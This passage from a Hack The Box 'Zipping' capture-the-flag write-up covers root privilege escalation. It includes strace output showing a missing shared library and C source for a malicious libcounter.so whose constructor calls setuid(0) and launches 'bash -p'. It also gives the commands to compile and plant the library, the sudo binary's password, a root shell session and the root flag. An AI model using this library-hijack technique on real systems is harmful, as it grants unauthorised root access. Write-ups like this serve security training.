+munmap(0x7f6bbc8e5000, 18225)           = 0
+newfstatat(1, &quot;&quot;, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x1), ...}, AT_EMPTY_PATH) = 0
+getrandom(&quot;\x5f\xe6\x1a\xcc\x30\x19\xbc\xd5&quot;, 8, GRND_NONBLOCK) = 8
+brk(NULL)                               = 0x55aeea52a000
+brk(0x55aeea54b000)                     = 0x55aeea54b000
+newfstatat(0, &quot;&quot;, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x1), ...}, AT_EMPTY_PATH) = 0
+write(1, &quot;Enter the password: &quot;, 20Enter the password: )    = 20
+read(0, 
+&quot;\n&quot;, 1024)                     = 1
+write(1, &quot;Invalid password, please try aga&quot;..., 36Invalid password, please try again.
+) = 36
+exit_group(1)                           = ?
++++ exited with 1 ++</code></pre><p id="5938be63-9a74-468a-a6dd-882310d912ab" class="">
+</p><p id="7c6571bb-ae4f-4293-ab65-85a4d3086492" class="">So there is library that is being called but is not there libcounter.so</p><p id="16611e92-1e5c-43c4-882c-d0e2ab0f60de" class="">
+</p><p id="61f36afc-ff65-4f55-97c1-f2be89b97b74" class="">So we can manipulate that and write to a file inside of that filename:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0e81b5b9-03ea-47ff-945c-a8220989f463" class="code"><code class="language-PowerShell">┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Zipping]
+└─$ cat libcounter.c                               
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+    setuid(0); 
+    system(&quot;/usr/bin/bash -p&quot;);
+}</code></pre><p id="f2feb9c1-c36c-4bba-97eb-b1d394d71b28" class="">
+</p><p id="e1efa4b2-3604-48a1-b669-4efdbe70c0bd" class="">Ok, we can compile the file:</p><p id="206cf06e-5fc7-4c14-bca5-edd9ae304ada" class=""><code>gcc -shared -fPIC -o </code><code><a href="http://libcounter.so/">libcounter.so</a></code><code> libcounter.c</code></p><p id="38b6016d-9fe4-48f9-a8a9-beabe6b04cfe" class="">
+</p><p id="adb976d5-2230-41ec-a539-f651dd3d243d" class="">We can transfer the file to the attack machine to /home/rektsu/.config</p><p id="6bfb8cb1-bab5-4e0a-b5a5-518ab9b02735" class="">
+</p><p id="f98971f3-5089-4b1a-b072-b515e1d09b34" class="">Once we execute the binary it should drop us into the root privileged shell!</p><p id="acf5ed2e-f36e-4e0c-ad3a-b1dae7178869" class=""><code>sudo /usr/bin/stock</code></p><p id="17b3c2e6-fdfb-4c8c-988c-ad197625fe76" class="">
+</p><p id="cf53604f-d88a-4547-bf5d-8a2e615931bc" class="">And we are root!</p><p id="3c08c364-ca3e-4a6b-b986-721f542de925" class="">#PoC</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8225935d-916e-4d43-a059-19678246f1db" class="code"><code class="language-PowerShell">rektsu@zipping:/home/rektsu/.config$ sudo /usr/bin/stock
+Enter the password: St0ckM4nager
+root@zipping:/home/rektsu/.config# whoami
+root
+root@zipping:/home/rektsu/.config# ls -la
+total 24
+drwxrwxr-x 2 rektsu rektsu  4096 Aug 27 23:56 .
+drwxr-x--x 7 rektsu rektsu  4096 Aug 27 23:17 ..
+-rw-rw-rw- 1 rektsu rektsu 15432 Aug 27 23:56 libcounter.so
+root@zipping:/home/rektsu/.config# cat /root/root.txt
+20af09b4ae0fc8347f6a8aa2f8804765
+root@zipping:/home/rektsu/.config#</code></pre><h2 id="31abcfef-4928-4e9d-920e-bf7ae6a70fce" class="">root: <mark class="highlight-red">20af09b4ae0fc8347f6a8aa2f8804765</mark></h2></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
